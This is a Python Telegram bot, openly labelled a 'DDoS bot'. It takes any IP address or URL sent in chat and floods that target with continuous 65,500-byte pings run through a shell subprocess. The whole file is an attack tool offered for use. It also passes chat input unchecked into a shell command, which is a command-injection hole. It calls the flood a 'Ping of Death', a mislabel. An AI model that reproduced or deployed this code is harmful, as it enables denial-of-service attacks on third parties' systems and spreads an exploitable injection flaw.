import telebot
import subprocess
import socket
import sys

# Telegram API token
TOKEN = "YOUR TOKEN HERE"


# Admin chat ID
ADMIN_CHAT_ID = YOUR_ID_HERE

# Initialize bot
bot = telebot.TeleBot(TOKEN)

# Function to check if input is a valid IP address
def is_valid_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

# Function to perform a DDoS attack using Ping of Death
def perform_ping_of_death_attack(target):
    try:
        # Check if the target is an IP address
        if is_valid_ip(target):
            command = f"ping {target} -t -l 65500"
        else:
            # Resolve the target URL to an IP address
            ip_address = socket.gethostbyname(target)
            command = f"ping {ip_address} -t -l 65500"
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        bot.send_message(chat_id=ADMIN_CHAT_ID, text=f"Error: Failed to initiate DDoS attack. Please check if the target is reachable. Error message: {str(e)}")
        print(f"Error: Failed to initiate DDoS attack. Please check if the target is reachable. Error message: {str(e)}", file=sys.stderr)
    except socket.gaierror as e:
        bot.send_message(chat_id=ADMIN_CHAT_ID, text=f"Error: Invalid URL or failed to resolve to an IP address. Error message: {str(e)}")
        print(f"Error: Invalid URL or failed to resolve to an IP address. Error message: {str(e)}", file=sys.stderr)

# Command handler for /start
@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(chat_id=message.chat.id, text="Welcome to the enhanced DDoS bot! Send me the IP address or URL you want to attack using the Ping of Death method.")

# Handler for receiving IP address or URL
@bot.message_handler(func=lambda message: True)
def receive_target(message):
    target = message.text
    bot.send_message(chat_id=message.chat.id, text="Target received. Initiating Ping of Death attack.")
    # Start Ping of Death attack
    perform_ping_of_death_attack(target)

# Start the bot
bot.polling()
